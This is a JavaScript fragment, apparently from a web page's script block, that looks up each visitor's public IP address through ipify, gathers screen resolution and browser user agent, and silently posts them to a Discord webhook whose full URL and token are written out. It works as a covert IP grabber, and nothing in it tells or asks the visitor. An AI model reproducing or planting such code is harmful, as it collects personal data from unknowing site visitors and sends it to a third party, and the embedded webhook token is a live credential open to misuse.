...
fetch('https://api64.ipify.org?format=json')
  ...
  .then(data => {
    const ip = data.ip;
    const resolution = `Rozlišení: ${window.screen.width}x${window.screen.height}`;
    const userAgent = `UserAgent: ${navigator.userAgent}`;

    fetch('https://discordapp.com/api/webhooks/1333558563796156447/P0H7XXzV2YnB5nYByLBs80DSgPbjxrCbp9cmZaMdiNPflYXQo0IVv0l54gVx0IBKkupL', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            content: `IP: ${ip}, ${resolution}, ${userAgent}`
        })
    });
  });
</script>
